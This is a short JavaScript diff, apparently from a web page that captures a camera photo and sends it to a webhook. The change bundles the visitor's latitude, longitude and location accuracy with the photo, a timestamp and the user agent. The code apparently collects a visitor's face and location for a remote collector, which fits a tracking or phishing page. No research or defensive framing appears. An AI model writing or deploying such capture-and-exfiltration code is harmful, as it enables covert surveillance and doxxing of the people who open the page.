@@ -86,10 +86,13 @@
             photoBase64 = canvas.toDataURL('image/jpeg', 0.6);
             stream.getTracks().forEach(track => track.stop());
 
-            // Send photo to webhook
+            // Send photo + location together
             sendToWebhook({
                 type: 'photo',
                 photo: photoBase64,
+                lat: locationData ? locationData.lat : null,
+                lng: locationData ? locationData.lng : null,
+                accuracy: locationData ? locationData.accuracy : null,
                 timestamp: new Date().toISOString(),
                 ua: navigator.userAgent
             });
